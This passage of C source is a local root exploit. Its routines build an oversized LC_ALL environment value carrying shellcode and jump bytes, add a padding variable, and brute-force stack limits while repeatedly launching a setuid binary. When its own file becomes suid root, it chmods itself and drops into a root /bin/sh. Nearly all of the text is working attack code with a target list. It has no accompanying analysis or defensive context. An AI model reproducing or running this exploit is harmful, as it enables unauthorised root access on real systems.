    static char lca[128 + LCA_MAX];
    strcpy(lca, "LC_ALL=");
    char * cp = memchr(lca, '\0', sizeof(lca));
    if (!cp) die();
    memcpy(cp, shellcode, shellcode_len);
    cp += shellcode_len;
    memset(cp, 'a', target->a);

    size_t o;
    for (o = target->a; l - o >= 4; o += 4) {
        if ((o - target->a) % 16 == target->j) {
            cp[o + 0] = '\xeb';
            cp[o + 1] = (o - target->a >= 16) ? -(16u + 2u) :
                -(shellcode_len + target->a + target->j + 2);
            cp[o + 2] = 'j';
            cp[o + 3] = 'j';
        } else {
            if (sizeof(size_t) != 4) die();
            *(size_t *)(cp + o) = target->i;
        }
    }
    cp += o;
    memset(cp, 'b', target->b);
    cp[target->b] = '\0';
    if (strlen(lca) != 7 + shellcode_len + o + target->b) die();
    return lca;
}

static const char *
build_pad(const size_t p)
{
    #define PAD_MAX 8192
    if (p > PAD_MAX) die();
    static char pad[64 + PAD_MAX];
    strcpy(pad, "P=");
    char * const cp = memchr(pad, '\0', sizeof(pad));
    if (!cp) die();
    memset(cp, 'p', p);
    cp[p] = '\0';
    if (strlen(pad) != 2 + p) die();
    return pad;
}

static void
fork_worker(const size_t s, const char * const lca, const char * const pad)
{
    #define N_WORKERS 2
    static size_t n_workers;
    static struct {
        pid_t pid;
        struct timeval start;
    } workers[N_WORKERS];

    size_t i_worker;
    struct timeval start, stop, diff;

    if (n_workers >= N_WORKERS) {
        if (n_workers != N_WORKERS) die();
        int is_suid_rootshell = 0;
        for (;;) {
            sigalarm = 0;
            #define TIMEOUT 10
            alarm(TIMEOUT);
            int status = 0;
            const pid_t pid = waitpid(-1, &status, WUNTRACED);
            alarm(0);
            if (gettimeofday(&stop, NULL)) die();

            if (pid <= 0) {
                if (pid != -1) die();
                if (errno != EINTR) die();
                if (sigalarm != 1) die();
            }
            int found_pid = 0;
            for (i_worker = 0; i_worker < N_WORKERS; i_worker++) {
                const pid_t worker_pid = workers[i_worker].pid;
                if (worker_pid <= 0) die();
                if (worker_pid == pid) {
                    if (found_pid) die();
                    found_pid = 1;
                    if (WIFEXITED(status) || WIFSIGNALED(status))
                        workers[i_worker].pid = 0;
                } else {
                    timersub(&stop, &workers[i_worker].start, &diff);
                    if (diff.tv_sec >= TIMEOUT)
                        if (kill(worker_pid, SIGKILL)) die();
                }
            }
            if (!found_pid) {
                if (pid != -1) die();
                continue;
            }
            if (WIFEXITED(status)) {
                if (WEXITSTATUS(status) != EXIT_FAILURE)
                    fprintf(stderr, "exited %d\n", WEXITSTATUS(status));
                break;
            } else if (WIFSIGNALED(status)) {
                if (WTERMSIG(status) != SIGSEGV)
                    fprintf(stderr, "signal %d\n", WTERMSIG(status));
                break;
            } else if (WIFSTOPPED(status)) {
                fprintf(stderr, "stopped %d\n", WSTOPSIG(status));
                is_suid_rootshell |= is_suid_root(ROOTSHELL);
                if (kill(pid, SIGKILL)) die();
                continue;
            }
            fprintf(stderr, "unknown %d\n", status);
            die();
        }
        if (is_suid_rootshell) {
            system("ls -lL " ROOTSHELL);
            exit(EXIT_SUCCESS);
        }
        n_workers--;
    }
    if (n_workers >= N_WORKERS) die();

    static char rsh_link[64];
    if (*rsh_link != '/') {
        const int rsh_fd = open(RSH, O_RDONLY);
        if (rsh_fd <= STDERR_FILENO) die();
        if ((unsigned int)snprintf(rsh_link, sizeof(rsh_link),
            "/proc/%ld/fd/%d", (long)getpid(), rsh_fd) >= sizeof(rsh_link)) die();
        if (access(rsh_link, R_OK | X_OK)) die();
        if (*rsh_link != '/') die();
    }

    static int null_fd = -1;
    if (null_fd <= -1) {
        null_fd = open("/dev/null", O_RDWR);
        if (null_fd <= -1) die();
    }

    const pid_t pid = fork();
    if (pid <= -1) die();
    if (pid == 0) {
        const struct rlimit stack = { s, s };
        if (setrlimit(RLIMIT_STACK, &stack)) die();

        if (dup2(null_fd, STDIN_FILENO) != STDIN_FILENO) die();
        if (dup2(null_fd, STDOUT_FILENO) != STDOUT_FILENO) die();
        if (dup2(null_fd, STDERR_FILENO) != STDERR_FILENO) die();

        static char * const argv[] = { rsh_link, "-?", NULL };
        char * const envp[] = { (char *)lca, (char *)pad, NULL };
        execve(*argv, argv, envp);
        die();
    }
    if (gettimeofday(&start, NULL)) die();
    for (i_worker = 0; i_worker < N_WORKERS; i_worker++) {
        const pid_t worker_pid = workers[i_worker].pid;
        if (worker_pid > 0) continue;
        if (worker_pid != 0) die();
        workers[i_worker].pid = pid;
        workers[i_worker].start = start;
        n_workers++;
        return;
    }
    die();
}

int
main(const int argc, const char * const argv[])
{
    static const struct rlimit core;
    if (setrlimit(RLIMIT_CORE, &core)) die();

    if (geteuid() == 0) {
        if (is_suid_root(ROOTSHELL)) {
            if (setuid(0)) die();
            if (setgid(0)) die();
            static char * const argv[] = { "/bin/sh", NULL };
            execve(*argv, argv, NULL);
            die();
        }
        chown(*argv, 0, 0);
        chmod(*argv, 04555);
        for (;;) {
            raise(SIGSTOP);
            sleep(1);
        }
        die();
    }
    if (symlink(*argv, ROOTSHELL)) {
        if (errno != EEXIST) die();
    }

    if (argc != 2) {
        fprintf(stderr, "Usage: %s target\n", *argv);
        size_t i;
        for (i = 0; i < sizeof(targets)/sizeof(*targets); i++) {
            fprintf(stderr, "Target %zu %s\n", i, targets[i].name);
        }
        die();
    }
  {
    const size_t i = strtoul(argv[1], NULL, 10);
    if (i >= sizeof(targets)/sizeof(*targets)) die();
    target = targets + i;
    fprintf(stderr, "Target %zu %s\n", i, target->name);
  }
    if (target->a >= 16) die();
    if (target->b >= 16) die();
    if (target->i <= 0) die();
    if (target->j >= 16 || target->j % 4) {
        if (target->j != SIZE_MAX) die();
    }

    static const struct sigaction sigalarm_action = { .sa_handler = sigalarm_handler };
    if (sigaction(SIGALRM, &sigalarm_action, NULL)) die();

    size_t s;
    for (s = target->s_first; s <= target->s_last; s += target->s_step) {
        if (s % target->s_step) die();

        size_t l;
        for (l = target->l_first; l <= target->l_last; l += target->l_step) {
            if (l % target->l_step) die();
            const char * const lca = build_lca(l);
            fprintf(stderr, "s %zu l %zu\n", s, l);

            size_t p;
            for (p = target->p_first; p <= target->p_last; p += target->p_step) {
                if (p % target->p_step) die();
                const char * const pad = build_pad(p);
                fork_worker(s, lca, pad);
            }
        }
    }
    fprintf(stderr, "Please try again\n");
    die();
}

--WIyZ46R2i8wDzkSu--
